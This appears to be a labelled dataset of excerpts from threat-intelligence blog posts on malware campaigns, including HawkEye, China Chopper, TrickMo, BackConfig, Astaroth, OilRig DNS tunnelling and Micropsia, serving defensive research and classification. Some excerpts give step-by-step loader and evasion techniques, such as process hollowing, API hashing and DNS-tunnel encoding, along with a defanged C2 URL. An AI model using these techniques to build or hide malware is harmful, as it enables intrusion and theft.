Distribution At the time of writing, there are 137 VST-related applications (42 for Windows and 95 for macOS) available on a single WordPress-based website with a domain registered on 24 August, 2018. The first application – Kontakt Native Instruments 5.7 for Windows – was uploaded on the same day. The size of the apps makes it impractical to analyze them all, but it seems safe to assume they are all Trojanized. The applications themselves are not hosted on the WordPress-based site, but on 29 external servers, which can be found in the IoCs section. The admins of the site also frequently update the applications with newer versions, making it difficult to track the very first version of the miner. Regarding the nature of the applications targeted, it is interesting to observe that their purpose is related to audio production; thus, the machines that they are installed on should have good processing power and high CPU consumption will not surprise the users. Also, these applications are usually complex, so it is not unexpected for them to be huge files. The attackers use this to their advantage to camouflage their VM images.

During our analysis, we also discovered several notable malware families, including Remcos and various cryptocurrency mining trojans , leveraging the same loader in an attempt to evade detection and impede analysis. Technical overview First, let's go through a high-level overview of the loader that's used to hide and execute HawkEye Reborn. The ""technical details"" section will describe these stages in detail. Even if the final malware is packed and coming with its own obfuscation, it is never written to the disk. It's always hidden inside the loader, so it's difficult for antivirus systems to detect it. Find and resolve some basic API calls by CRC32. Decode encoded code from the .data section. Jump to this code. Perform some anti-debug/anti-analysis checks. Load two resources (in this case, UDXCUSCK and SCCJZ) from the loader's PE file. Decode the configuration stored in the UDXCUSCK resource. Copy loader to %APPDATA% folder and make it persistent via StartUp link. Decode the malware payload (in this case HawkEye) stored in SCCJZ resource. Start the legitimate RegAsm.exe process. Inject and execute malware payload (HawkEye) into this process via process-hollowing. Protect injected malware code. Exit loader process. The majority of API calls are executed by a function we called ""Exec_Function"": This function takes a custom hash value for the wanted API call as one of its arguments. It finds the kernel.dll address via its CRC32 checksum. Then, it resolves the addresses of basic API calls by name by iterating over the InMemoryOrderModuleList in the PEB_LDR_DATA structure.

Cisco Talos discovered significant China Chopper activity over a two-year period beginning in June 2017, which shows that even nine years after its creation, attackers are using China Chopper without significant modifications. This web shell is widely available, so almost any threat actor can use. This also means it's nearly impossible to attribute attacks to a particular group using only presence of China Chopper as an indicator. The usage of China Chopper in recent campaigns proves that a lot of old threats never really die, and defenders on the internet need to be looking out for malware both young and old. What is China Chopper? China Chopper is a tool that allows attackers to remotely control the target system that needs to be running a web server application before it can be targeted by the tool. The web shell works on different platforms, but in this case, we focused only on compromised Windows hosts. China Chopper is a tool that has been used by some state-sponsored actors such as Leviathan and Threat Group-3390 , but during our investigation we've seen actors with varying skill levels. In our research, we discovered both Internet Information Services (IIS) and Apache web servers compromised with China Chopper web shells. We do not have additional data about how the web shell was installed, but there are several web application frameworks such as older versions of Oracle WebLogic or WordPress that may have been targeted with known remote code execution or file inclusion exploits. China Chopper provides the actor with a simple GUI that allows them to configure servers to connect to and generate server-side code that must be added to",1

They aim for their victim’s private email addresses, which they most likely collected from the victim’s own address list, which also includes managers and employees in the technology industry. Private email addresses are more likely to be hosted on free email services with lax security and spam filtering. They’re also usually used as verification for social media and e-commerce websites, as well as backups for Gmail and business accounts. Gmail accounts are particularly interesting; attackers that gain access to these accounts can also access the victim’s Google Drive, and, under certain circumstances, potentially compromise the Android device linked to the account. These free email accounts could thus serve as better starting points for attackers to reconnoiter and gather intelligence on their targets compared to business emails, which are typically more secure. Heatstroke’s attack chain Heatstroke’s operators appear to have used these countermeasures to hide their trails: Multistage phishing attack.

This human-computer convention means that most digital content has some descriptive surface area, or descriptive “features” that are present in many files, including malware files. FireEye approaches detection and hunting from many angles, but on FireEye’s Advanced Practices team, we often like to flex on “weak signals.” We like to search for features of malware that are not evil in isolation but uncommon or unique enough to be useful. We create conditional rules that when met are “weak signals” telling us that a subset of data, such as a file object or a process, has some odd or novel features. These features are often incidental outcomes of adversary methods, or modus operandi, that each represent deliberate choices made by malware developers or intrusion operators. Not all these features were meant to be in there, and they were certainly not intended for defenders to notice. This is especially true for PDB paths, which can be described as an outcome of the compilation process, a toolmark left in malware that describes the development environment. PDBs A program database (PDB) file, often referred to as a “symbol file,” is generated upon compilation to store debugging information about an individual build of a program. A PDB may store symbols, addresses, names of functions and resources and other information that may assist with debugging the program to find the exact source of an exception or error. Malware is software, and malware developers are software developers. Like any software developers, malware authors often have to debug their code and sometimes end up creating PDBs as part of their development process. If they do not spend time debugging their malware, they risk their malware not functioning correctly on victim hosts, or not being able to successfully communicate with their malware remotely. How PDB Paths are Made (the birds and the PDBs?) But how are PDBs created and connected to programs? Let’s examine the formation of one PDB path through the eyes of a malware developer and blogger, the soon-to-be-infamous “smiller.” Smiller has a lot of programming projects and organizes them in an aptly labeled folder structure on his computer. This project is for a shellcode loader embedded in an HTML Application (HTA) file, and the developer stores it quite logically in the folder: D:\smiller\projects\super_evil_stuff\shellcode\ Figure 1: The simple “Test” project code file “Program.cs” which embeds a piece of shellcode and a launcher executable within an HTML Application (HTA) file Figure 2: The malicious Visual Studio solution HtaDotnet and corresponding “Test” project folder as seen through Windows Explorer.

It is one of the reasons that a large chunk of the content available on the internet is free. It allows people to support their passion projects, their small businesses, and the food blogs of people around the world. However, it is a highly complex and convoluted system that is ripe for abuse. This is an issue that should not be ignored by the public, as these malicious ads can deliver malware out of nowhere and trick traditional internet users who may not be aware of the threats that exist on some pages. This blog is going to walk through how online advertising works, what malvertising is and why it's dangerous including real life examples, and finally the options that exist for organizations and private citizens to try and protect themselves from these threats. Online advertising primer Online advertising is big business. In 2018, the United States digital advertising revenue exceeded $100 billion. To put that in perspective, that's as large as the annual revenues for leading aerospace and multinational banking companies. So how does this complicated industry operate and how are ads served to users? There are numerous types of online advertising and associated ways to make money from it. One common distinction is between sponsored content and banner ads. Most users are familiar with banner ads as they tend to be somewhat isolated from the content of the webpage. Sponsored content, on the other hand, can appear on a page mixed in among the original content on the page. It typically will have some sort of identifier saying ""Sponsored Content"" and when a user clicks the link they are typically taken through the ad network to another site. Inside of each of these categories there are a wide variety of options for the advertiser. However, for the purposes of this blog we are going to focus on the area of online advertising that is the most ripe for abuse, real time bidding (RTB). Let's start by talking about the components of an RTB advertising network. The first piece is the publisher, who gets paid to host ads on their site. To host ads, the publisher utilizes an advertising server. There are several ad servers to choose from, including self-hosted or service solutions. Self-hosted ad server options include open-source and paid solutions. The second key portion of an RTB network is an",0

ESET security products detect these threats as Win{32,64}/BalkanRAT and Win32/BalkanDoor. A typical victim of this campaign, which uses malicious emails as its spreading mechanism, ends up having both these tools deployed on the computer, each of them capable of fully controlling the affected machine. This rather uncommon setup makes it possible for attackers to choose the most suitable method to instruct the computer to perform operations of their choice. The campaign’s overarching theme is taxes. With the contents of the emails, included links and decoy PDFs all involving taxes, the attackers are apparently targeting the financial departments of organizations in the Balkans region. Thus, although backdoors and other tools for remote access are often used for espionage, we believe that this particular campaign is financially motivated. The campaign has been active at least from January 2016 to the time of writing (the most recent detections in our telemetry are from July 2019). Some parts of the campaign were briefly described by a Serbian security provider in 2016 and the Croatian CERT in 2017. Each of these sources focused only on one of the two tools and only on a single country. However, our research shows that there is a significant overlap in targets and also in the attackers’ tactics, techniques and procedures. Our findings show that the mentioned attacks have been orchestrated and we consider them a single long-term campaign that spans Croatia, Serbia, Montenegro, and Bosnia and Herzegovina. Our research has also shed more light at the malware used in this campaign and provided some context. We’ve discovered a new version of BalkanDoor with a new method for execution/installation: an exploit of the WinRAR ACE vulnerability ( CVE-2018-20250 ). Furthermore, we’ve seen both malicious tools digitally signed with various certificates the developers paid for to add perceived legitimacy. One of",0

Across the global threat landscape, there has been a clear history of leveraging (or porting) Windows malware to the Apple OS X platform. In 2012, AlienVault discovered a document file exploiting an older vulnerability in Microsoft Word that installs a backdoor named “ MacControl ” on OS X systems. The group responsible for those attacks had been targeting Tibetan non-government organizations (NGOs). It was later discovered that the code for this backdoor was borrowed from an existing Windows backdoor, whose source code can be found on several Chinese programming forums. In 2013, Kaspersky reported on a threat actor group they named “ IceFog ” that had been attacking a large number of entities related to military, mass media, and technology in South Korea and Japan. This group developed their own backdoor for both Windows and OS X. And just this year, Kaspersky published a report on a group they named ""Careto/Mask"" that utilized an open source netcat-like project designed to run on *nix and Windows systems named ‘sbd’ which they wrapped in a custom built installer for OS X. Based on our historical intelligence, we believe the XSLCmd backdoor is used by APT, including a group that we call “GREF.” We track this threat group as “GREF” due to their propensity to use a variety of Google references in their activities – some of which will be outlined later in this report.

939,Long_Train,"Bypass App to Bank Customers in Germany March 24, 2020 | By Pavel Asinovsky | 13 min read iStock IBM X-Force researchers analyzed an Android malware app that’s likely being pushed to infected users by the TrickBot Trojan. This app, dubbed “TrickMo” by our team, is designed to bypass second factor and strong authentication pushed to bank customers when they need to authorize a transaction. While it’s not the first of its kind, this Android malware app is more sophisticated than similar apps and possesses interesting features that enable its operators to steal transaction authorization codes from victims who download the app. According to our research, TrickMo is still under active development as we expect to see frequent changes and updates. While it can be used anywhere and target any bank or region, at this time, we are seeing it deployed specifically in Germany. Germany is one of the first attack turfs TrickBot spread to when it first emerged in 2016. In 2020, it appears that TrickBot’s vast bank fraud is an ongoing project that helps the gang monetize compromised accounts. First Signs in September 2019 In September 2019, a tweet by CERT-Bund caught the attention of the IBM Trusteer Mobile Security Research team. The tweet stated that TrickBot , a well-known banking Trojan owned by an organized cybercrime gang, uses man-in-the-browser (MITB) web injects in online banking sessions to ask infected users for their mobile phone number and device type.

This is an extremely experienced group likely to keep their activities even after exposure, even if we identified mistakes and bad copy/paste, they are doing this job for more than 10 years. We think that exposing this malware, explaining the behavior and the campaigns where Bisonal was used is important to protect the potential future targets. The targets to this point are located in the public and private sectors with a focus on Russia, Japan and South Korea. We recommend the entities located in this area to prepare for this malware and actor and implement detections based on the technical details provided in this article. Victimology and campaigns From our analysis and the intelligence shared by the community throughout the last decade of activities of Bisonal, we can conclude that the actor behind this malware is specifically targeted at the South East Asian region, namely Japan and Korea with another significant focus on Russian-speaking victims. We identified a couple of decoy documents pointing to the victims. During the Heartbeat campaign documented in 2012 by Trend Micro , dating back to 2009, the attacker used Hangul Word Processor (HWP) decoy documents. This file format is mainly used in South Korea. The report mentioned political parties, media outfits, a national policy research institute, a military branch of South Korean armed forces, a small business sector organization and branches of the South Korean government. Later in 2018, Unit 42 released a Bisonal paper where we can see a spear-phishing campaign in Russian and a decoy document alleged to be from Rostec, a Russian state-owned holding conglomerate headquartered in Moscow. Finally, in 2018, Ahnlab released a paper about ""Operation Bitter Biscuit"" where Bisonal was used against Korean and Japanese entities. India is also mentioned, but it was by another malware named ""Bioazih"" by Ahnlab. In this paper, the editor mentions targets such as manufacturers, defense industry and government. Additionally, we can provide additional decoy documents. For example, a Korean document used in September 2014 where the title was ""Contact member and counselor of the Agriculture, Forestry, Livestock, Food and Marine Fisheries Committee:"" Or a Russian document about the CIPR Digital conference used in April 2018. This is an application document that has been used to provide a decoy to the Bisonal malware. This conference has some high-ranking government and business attendees.

Attacks usually begin with a targeted email sent to an organization. The next step is to steal legitimate documents from the compromised systems within that organization and then weaponize and distribute them to other unsuspecting victims. To do this, a lure message that prompts the user to enable their content is added to those files, which are often carrying logos of real companies or governmental entities. The well-crafted and socially engineered malicious documents then become the first stage of a long and mainly fileless infection chain that eventually delivers POWERSTATS, a signature PowerShell backdoor of this threat group. This powerful backdoor can receive commands from the attackers, enabling it to exfiltrate files from the system it is running on, execute additional scripts, delete files,",1

We identified infrastructure overlaps and string references to previous Wolf Research work. The organization appears to be shut down, but the threat actors are still very active. We identified campaigns targeting Thai users and their devices. Some of the C2 servers are located in Thailand. The panels also contain Thai JavaScript comments and the domain names also contain references to Thai food, a tactic commonly employed to entice users to click/visit these C2 panels without much disruption. We identified a notable lack of sophistication in this investigation such as copy/paste, unstable code, dead code and panels that are freely open. What's new? WolfRAT is based on a previously leaked malware named DenDroid. The new malware appears to be linked to the infamous Wolf Research organization and targets Android devices located in Thailand. How did it work? The malware mimics legit services such as Google service, GooglePlay or Flash update. The malware is not really advanced and is based on a lot of copy/paste from public sources available on the Internet.

In at least one case, the malware operators compromised a victim’s build system, which could have led to a supply-chain attack, allowing the attackers to trojanize game executables. In another case, the game servers were compromised, which could have allowed the attackers to, for example, manipulate in-game currencies for financial gain. The Winnti Group, active since at least 2012, is responsible for high-profile supply-chain attacks against the software industry, leading to the distribution of trojanized software (such as CCleaner , ASUS LiveUpdate and multiple video games ) that is then used to compromise more victims. Recently, ESET researchers also discovered a campaign of the Winnti Group targeting several Hong Kong universities with ShadowPad and Winnti malware. About the “Winnti Group” naming: We have chosen to keep the name “Winnti Group” since it’s the name first used to identify it, in 2013, by Kaspersky. Since Winnti is also a malware family, we always write “Winnti Group” when we refer to the malefactors behind the attacks. Since 2013, it has been demonstrated that Winnti is only one of the many malware families used by the Winnti Group. Attribution to the Winnti Group Multiple indicators led us to attribute this campaign to the Winnti Group. Some of the C&C domains used by PipeMon were used by Winnti malware in previous campaigns mentioned in our white paper on the Winnti Group arsenal .

The technique allows the injection of a DLL from memory rather than from disk. This technique is stealthier than regular DLL injection because aside from not needing the actual DLL file on disk, it also does not need any windows loader for it to be injected. This eliminates the need for registering the DLL as a loaded module of a process, and allowing evasion from DLL load monitoring tools. Recently, we have witnessed threat actors",0

The malware has functionality that enables it to download/upload/execute files, steal credentials from Chrome/Firefox browsers, and perform file management, among other things. It targets Windows systems, but its design and certain pieces of code suggest cross-platform compatibility may be a future goal.

More blatantly, the build pipelines themselves may also be actively compromised, like in the Webmin incident . Other historical examples include making backdoored toolchains available for download that then introduce backdoors in compiled code like in the infamous malicious XCode incident . On March 9, we received a message from a security researcher informing us about a set of GitHub-hosted repositories that were, presumably unintentionally, actively serving malware. After a deep-dive analysis of the malware itself, we uncovered something that we had not seen before on our platform: malware designed to enumerate and backdoor NetBeans projects, and which uses the build process and its resulting artifacts to spread itself.

As of the end of March, we identified 116,357 coronavirus-related newly registered domain names. Out of these, 2,022 are malicious and 40,261 are “high-risk”. We analyzed these domains by clustering them based on their Whois information, DNS records and screenshots (collected by our automated crawlers) to detect registration campaigns. We found that while many domains are registered to be resold for a profit, a significant fraction of them are used for both well-known malicious activities as well as for fraudulent shops selling items in short supply. The traditional malice abusing coronavirus trends includes domains hosting malware, phishing sites, fraudulent sites, malvertising, cryptomining, and black hat Search Engine Optimization (SEO) for improving search rankings of unethical websites. Interestingly, although many webshops that use newly registered domains try to scam users, we detected an especially unethical cluster of domains capitalizing on users’ fear of coronavirus to further frighten them into buying their products. Moreover, we discovered a group of coronavirus-themed domains, which now serve parked pages with high-risk JavaScript that may at any time start redirecting users to malicious content. In this blog, we first showcase the increasing trend of user interests in coronavirus-related topics on the Internet, with data from both Google Trends and our service traffic logs. Second, we illustrate the significant increase in domain registration activities recently for domain names containing coronavirus-related keywords. Third, we present a detailed case study on how cybercriminals are abusing and monetizing such user interests on the Internet. Finally, we conclude with a discussion of best practices.

Encoded and encrypted C2 domains pulled from YouTube channel descriptions. So what? Astaroth is another example of the level of sophistication crimeware is consistently achieving. This level of anti-analysis/evasion should be noted, as the likelihood of this spreading beyond just Brazil is high. Organizations need to be prepared for these evasive and effective information stealers and prepared to defend against the sophisticated attack. Another example of how most adversaries are using COVID-19 themed campaigns to increase effectiveness. Executive summary The threat landscape is littered with various malware families being delivered in a constant wave to enterprises and individuals alike. The majority of these threats have one thing in common: money. Many of these threats generate revenue for financially motivated adversaries by granting access to data stored on end systems that can be monetized in various ways. To maximize profits, some malware authors and/or malware distributors go to extreme lengths to evade detection, specifically to avoid automated analysis environments and malware analysts that may be debugging them. The Astaroth campaigns we are detailing today are a textbook example of these sorts of evasion techniques in practice. The threat actors behind these campaigns were so concerned with evasion they didn't include just one or two anti-analysis checks, but dozens of checks, including those rarely seen in most commodity malware. This type of campaign highlights the level of sophistication that some financially motivated actors have achieved in the past few years. This campaign exclusively targeted Brazil, and featured lures designed specifically to tailor to Brazilian citizens, including COVID-19 and Cadastro de Pessoas Físicas status. Beyond that, the dropper used sophisticated techniques and many layers of obfuscation and evasion before even delivering the final malicious payload. There's another series of checks once the payload is delivered to ensure, with reasonable certainty, that the payload was only executed on systems located in Brazil and not that of a researcher or some other piece of security technology, most notably sandboxes. Beyond that, this malware uses novel techniques for command and control updates via YouTube, and a plethora of other techniques and methods, both new and old. This blog will provide our deep analysis of the Astaroth malware family and detail a series of campaigns we've observed over the past nine to 12 months.

The modular nature certainly allows for quicker changes to individual components and, perhaps more importantly for the attackers, splits up the malicious behaviors in such a way that could thwart sandbox and dynamic analysis systems, especially when analyzing the components in isolation. Our threat prevention platform with WildFire detects activity associated with this threat group, while simultaneously updating the ‘malware’ category within the PAN-DB URL filtering solution for malicious and/or compromised domains that have been identified. Indicators of compromise related to this research are documented at the end of this report and in the Adversary Playbook for the Hangover threat group that can be accessed in the Unit 42 Playbook Viewer . Starting Point Unit 42 first saw activity involving the Windows PE executable file (SHA256: 84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c ) when searching AutoFocus data related to particular sectors and countries of interest. The file was first seen on January 19th, 2020, having been downloaded by two organizations — a government department in one country and a military organization in another — within minutes of each other. The source of the download was http://212.114.52[.]148/request/httpsrequest and the file httpsrequest was stored locally as dphc.exe. More details on how the malware was delivered are described later in the blog. The choice of terminology in URL paths and file names when delivering BackConfig malware in this, and other campaigns discussed later on, is clearly to blend in as benign operations, paths and filenames. Although spelled differently, it could be easy to believe the payload relates to the DHCP networking service. The purpose of this malware is to allow the actors to download and execute an executable file, as well as download and run batch files to run commands on the end system. This sample has a custom “decryption” routine that subtracts six from each character. The following strings are decrypted using this method: linkrequest[.]live \\Adobe\\Driver\\dwg\\pid.txt \\Adobe\\Driver\\dwg\\ \\Adobe\\Driver\\dwg\\wuaupdt.exe The Trojan reads the following file to use in the URL of the C2 beacon.

While broad in their targeting, these actors have exercised minimal restraint in terms of targeting organizations that are critical to COVID-19 response efforts. Specifically, we find it alarming that several of these campaigns recklessly included targets at government healthcare agencies, local and regional governments, large universities with medical programs/centers, regional utilities, medical publishing firms, and insurance companies across the United States, Australia, Canada, Italy, and the United Kingdom. According to the recently released annual report from the Internet Crime Complaint Center (IC3), the Federal Bureau of Investigation (FBI) observed a record 23,775 BEC attacks in 2019. Significantly greater than all other categories of cybercrime over the same period, these attacks resulted in an estimated US$1.77 billion in global losses. With the global impacts of COVID-19, an unprecedented number of corporations are expediating their cloud infrastructure migrations, all while transitioning to a largely remote workforce that is understandably interested in all topics related to the virus. Given this trend, it should come as no surprise that BEC actors are seizing opportunities to exploit the situation through tailored phishing campaigns related to COVID-19.

This multi-wave attacks focused on obtaining data of specific, high-value targets and resulted in a complete takeover of the network. Key Points Earlier this year, Cybereason identified an advanced, persistent attack targeting telecommunications providers that has been underway for years, soon after deploying into the environment. Cybereason spotted the attack and later supported the telecommunications provider through four more waves of the advanced persistent attack over the course of 6 months. Based on the data available to us, Operation Soft Cell has been active since at least 2012, though some evidence suggests even earlier activity by the threat actor against telecommunications providers. The attack was aiming to obtain CDR records of a large telecommunications provider. The threat actor was attempting to steal all data stored in the active directory, compromising every single username and password in the organization, along with other personally identifiable information, billing data, call detail records, credentials, email servers, geo-location of users, and more. The tools and TTPs used are commonly associated with Chinese threat actors During the persistent attack, the attackers worked in waves- abandoning one thread of attack when it was detected and stopped, only to return months later with new tools and techniques. Security Recommendations Add an additional security layer for web servers. For example, use WAF (Web Application FW) to prevent trivial attacks on Internet-facing web servers. Expose as few systems or ports to the Internet as possible. Make sure that all web servers and web services that are exposed are patched. Use an EDR tool to give visibility and immediate response capabilities when high severity incidents are detected. Proactively hunt in your environment for sensitive assets periodically.

1021,Long_Train,"OSX/Bundlore Loader evolution A critical task for virtually any sophisticated malware is the loading phase. This is an important initial phase of “loading malicious code into the system” and is a critical point for a security solution to start detecting a malicious behavior. Failure to detect a malware while it is loading is obviously too late as the malicious routines will start executing (e.g: hooking user processes, privilege escalation, executing ransomware, loading other executables, lateral movement, etc..) That might also explain why we have so many OSX/Shlayer X variants as they keep changing ways to load malware into macOS systems. In a similar fashion, OSX/Bundlore Loader also sustained sudden changes that we will document in this blog post. OSX/Bundlore — November Campaign We stumbled upon a recent Malvertising campaign targeting the United States. Impacted visitors are redirected to a malicious domain that offers yet another flash player update, to ultimately download an unsigned Adobe Flash Player.dmg. When mounted, we found a malicious and unsigned app AdobleFlashPlayer.app executing a Bash script : Bash script, decoding OSX/Bundlore Loader This bash script will base64 decode and execute an unsigned Mach-O x64 binary we will refer to it as : OSX/Bundlore Loader.

New macOS Bundlore sample detected by Confiant The recent version that we detected above does things differently. The AES decryption mechanism was replaced with 9 weird looking functions. Here’s a quick analysis: The overall execution process is the same as the previous version: The child process is created via fork() The previous pipe created by the parent process will be duplicated to STDIN via dup2(). ( Hence the xor ESI, ESI, which returns ESI=0, and 0 is the macro value of the STDIN file descriptor.)

We discovered the following Clop ransomware samples which were signed with a certificate: This malware is prepared to avoid running under certain conditions, for example in the first version it requests to be installed as a service; if that will not succeed, it will terminate itself. The malware’s first action is to compare the keyboard of the victim computer using the function “GetKeyboardLayout” against the hardcoded values. This function returns the user keyboard input layout at the moment the malware calls the function. The malware checks that the layout is bigger than the value 0x0437 (Georgian), makes some calculations with the Russian language (0x0419) and with the Azerbaijan language (0x082C).

However, in one of its recent campaigns, we’ve discovered a piece of Waterbear payload with a brand-new purpose: hiding its network behaviors from a specific security product by API hooking techniques. In our analysis, we have discovered that the security vendor is APAC-based, which is consistent with BlackTech’s targeted countries. Knowing which specific APIs to hook might mean that the attackers are familiar with how certain security products gather information on their clients’ endpoints and networks. And since the API hooking shellcode adopts a generic approach, a similar code snippet might be used to target other products in the future and make Waterbear harder to detect. A closer look at Waterbear Waterbear employs a modular approach to its malware. It utilizes a DLL loader to decrypt and execute an RC4-encrypted payload. Typically, the payload is the first-stage backdoor which receives and loads other executables from external attackers. These first-stage backdoors can be divided into two types: First, to connect to a command-and-control (C&C) server, and second, to listen in on a specific port.

Ability to terminate process on the infected endpoint etc. Analysis of a recently discovered preliminary variant of ObliqueRAT in this post presents insights into the evolution of this threat. Analyses of the key similarities and differences between the two campaigns of ObliqueRAT and CrimsonRAT show us the changes in tactics and techniques of the attackers used to continue attacks while trying to bypass detections.

By performing efficient cyber espionage actions against institutions like the Hetman Petro Sahaidachnyi National Ground Forces Academy, Gamaredon increases the military preparedness of the Donbas militias and local paramilitary groups. Gamaredon illustrates how the fifth cyber domain enables militants to continue fighting even when all other domains are denied by the strategic or political framework.

1068,Long_Train,"threat group has introduced new tools using different tunneling protocols to their tool set. Figure 1 shows a timeline of when OilRig first used each of the 5 tools and their sub-variants in attacks, based on our visibility. Figure 1. Timeline of OilRig introducing DNS tunneling tools Regardless of the tool, all of the DNS tunneling protocols use DNS queries to resolve specially crafted subdomains to transmit data to the C2 and the answers to these queries to receive data from the C2. Therefore, the protocols must abide by the DNS protocol , so the specially crafted subdomains must have labels (portions of the subdomain separated by periods) must start and end with a letter or digit, contain letters, digits and hyphens and be less than 63 characters in length. Also, the entire domain queried, which includes the C2 domain and the specially crafted subdomain cannot exceed 253 characters. The protocol used by each of the five tools to communicate with its C2 via DNS tunneling differ in many ways. First, the structure of the subdomains queried that the tools use to transmit information to the C2 differ. Next, the structure of the data received by the Trojans from the C2 in the answers to the DNS queries differ as well. The structure of the subdomains used to transmit data differ dramatically, both in the amount of data included and the encoding used to represent the data. The two encoding methods used by these tools to transmit data within the subdomains included base16 and base64 encoded data. The encoding method greatly impacts the amount of data the tool is able to transmit in the subdomain of each query, as base16 requires 2 ASCII characters to represent each byte of data, so each character byte within the subdomain can transmit half (.5) a byte of data. Compare this with the use of base64 to encode the data, in which each character of base64 encoded data in the subdomain represents 6-bits (.75 bytes) of the data. This makes the base64 encoding more effective from a transmission throughput perspective. The DNS query type used by the Trojan for its tunnel greatly effects the amount of data that the C2 can transmit to the Trojan for each query. For instance, the tools that issue DNS A queries transmit data via IPv4 addresses within the answers, so the C2 is only able to transmit 4-bytes per query, whereas tools using AAAA queries can transmit 16-bytes within the IPv6 answer. Table 1 shows the tools and their variants covered in this blog with a focus on the number of bytes of data the C2 can provide per query, the amount of characters used in the specially crafted subdomain, the corresponding amount of data bytes sent per query and the encoding format used to transmit the data. The table below shows that QUADAGENT can transmit the most amount of data per query, as it has 60 characters within its subdomain to transmit base64 encoded data, meaning each query can transmit 45 (60*.75 = 45) bytes of data. The table also shows that the updated version of BONDUPDATER can download the most amount of bytes per query, as the C2 can provide 186.75 bytes of data thanks to the 255-byte maximum size for TXT queries and the C2 providing base64 encoded data after a 6 character sequence number ((255-6)*.75 = 186.75), which will be discussed later in this blog.

Notably, rather than being a full-fledged banking malware, SAIGON's capabilities suggest it is a more generic backdoor, perhaps tailored for use in targeted cybercrime operations. Technical Analysis Behavior SAIGON appears on an infected computer as a Base64-encoded shellcode blob stored in a registry key, which is launched using PowerShell via a scheduled task. As with other Ursnif variants, the main component of the malware is a DLL file. This DLL has a single exported function, DllRegisterServer , which is an unused empty function. All the relevant functionality of the malware executes when the DLL is loaded and initialized via its entry point. Upon initial execution, the malware generates a machine ID using the creation timestamp of either %SystemDrive%\pagefile.sys or %SystemDrive%\hiberfil.sys (whichever is identified first). Interestingly, the system drive is queried in a somewhat uncommon way, directly from the KUSER_SHARED_DATA structure (via SharedUserData→NtSystemRoot ). KUSER_SHARED_DATA is a structure located in a special part of kernel memory that is mapped into the memory space of all user-mode processes (thus shared), and always located at a fixed memory address (0x7ffe0000 , pointed to by the SharedUserData symbol). The code then looks for the current shell process by using a call to GetWindowThreadProcessId(GetShellWindow(),",1

Subscribe for Updates Introduction Research By: Assaf Dahan, Lior Rochberger, Eli Salem, Mary Zhao, Niv Yona, Omer Yampel and Matt Hart Cybereason Nocturnus is monitoring a new wave of targeted campaigns against financial, manufacturing and retail businesses that began in early October. Similar to attacks previously reported by Cybereason , this campaign started with a TrickBot infection and progressed into a hacking operation targeting sensitive financial systems. However, unlike previous operations that focused on causing a massive ransomware infection ( Ryuk and LockerGoga ) by compromising critical assets like the domain controller, this new operation is focused on targeting point of sale (PoS) systems. The campaign leverages a newly discovered malware family called Anchor exclusively for high-profile targets. Learn more about additional attacks that leverage TrickBot. This research focuses on the following aspects of the TrickBot-Anchor attack: Anatomy of the Attack: A step-by-step anatomy of the attacks, including infection vectors and a dissection of the tools and techniques used by the attackers. New Malware: The discovery of a new malware family called Anchor , which includes the Anchor_DNS and a new, undocumented Anchor that has been operating since August 2018 (and potentially even earlier). The Anchor malware is a backdoor used very selectively on high-profile targets, and appears to be tightly connected to TrickBot, potentially even authored by the same individuals who created TrickBot. While this blog does not discuss attribution explicitly, the nature of these attacks, specifically the motivation, some of the tools and techniques detailed, have certain resemblance to past attacks that were linked to the financially-motivated FIN6 threat actor, a group that is known to target POS systems and has been linked to TrickBot infections in the past. Lastly, our blog emphasizes the gravity and danger that lies in commodity malware infections, as they have the potential of escalating into a hacking operation. This can easily lead to a disastrous outcome, whether it be a ransomware infection or theft of sensitive financial data. Key Points The TrickBot-Anchor Operation: Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing, and retail businesses across the United States and Europe.

While admittedly the version numbers provided by SharePoint within HTTP responses do not always provide the precise SharePoint version number, we decided to use it to check if it was less than the version numbers of the patched SharePoint versions from the Microsoft advisory . We performed this comparison and found 28,881 servers that advertised a vulnerable version of SharePoint. We did not actively check each server to verify if they were indeed vulnerable, so it is possible that many of these public-facing SharePoint servers were not vulnerable or since patched. Regardless, the sheer number of servers and publicly available exploit code suggests that CVE-2019-0604 is still a major attack vector. Using this collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket’s atexec tool to use dumped credentials to run commands on other systems. On September 19, 2019, we observed the same exact Mimikatz variant uploaded to a webshell hosted at another government organization in a second country in the Middle East. The Mimikatz variant uploaded to these two organizations is unique, as it involves a seemingly custom loader application written in .NET.

This approach makes it more difficult for threat hunters and defenders to find those needles in the haystack necessary to identify a campaign and its objectives. However even if an attacker uses commodity builders and tools, there is always a chance to find specific signals or characteristics that help to identify and track an actor’s infrastructure. One of the groups well known for following these TTPs is the Cobalt Gang, which is still active even after the arrest of their alleged leader in Spain this year.

Using numerous decoy documents and phishing emails, both styles of attacks lacked overall sophistication, but the effectiveness of this group and campaign cannot be denied. Attack Delivery and Infrastructure Analysis The attack methodology, as well as analysis of several of the “.vbs”, “.doc” and “.exe” samples found hosted in the attacker’s infrastructure has been covered by 360 and Tuisec. Both 360 and Tuisec found that the most commonly observed and consistent attack pattern consists of the following stages: Figure 1. Basic attacker methodology At the initial stage, the phishing attempts are kept very simple and lightweight by using OLE2Link objects that will usually make use of URL shortening services such as Bitly and t2m[.]io. Figure 2 OLE2Link content example While investigating the domains and infrastructure used by the phishing components of Gorgon Group, Unit 42 researchers witnessed several common operational security flaws with Gorgon Group’s actors throughout their many campaigns. It was one of these OPSEC failures that gave us an interesting cross-section of malware Gorgon Group is using. Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states. Additionally, there was a plethora of malware samples that were criminal in nature. Figure 3.

While the campaign and victims were selectively targeted, some instances contaminated machines in other countries as well (see below). Infection Process Attackers gathered intelligence and used social engineering to select their victims. They have sent spear phishing emails to email addresses of selected personas. The email contains an attached file that looked like a report from a known news agency with a malicious executable downloaded and activated in the background. Malware Capabilities Micropsia comes with an impressive arsenal of advanced surveillance features, allowing it to closely track the victim’s activity and control the victim’s operating system. Currently, the following capabilities exist in the analyzed binary: Microphone recording Document stealing from connected USB flash drives Screen capturing Keylogging Document stealing from hard drive Scanning all drives – full directory listing without filters Get files by specific path Download and execute an arbitrary executable Update malware executable Microphone Recording The microphone recording capability is considered an advanced surveillance feature, which is a rare occurrence among widespread malware. That said, it might become common when initiating an APT attack. While the malware’s screen capturing and keylogging capabilities are set to ‘on’ by default, the recording feature requires an activation command from the C&C at intervals defined by the operator. Once activated, Micropsia begins recording using Win32 MCI (Media Control Interface), which provides a generic interface to nearly every kind of multimedia device. 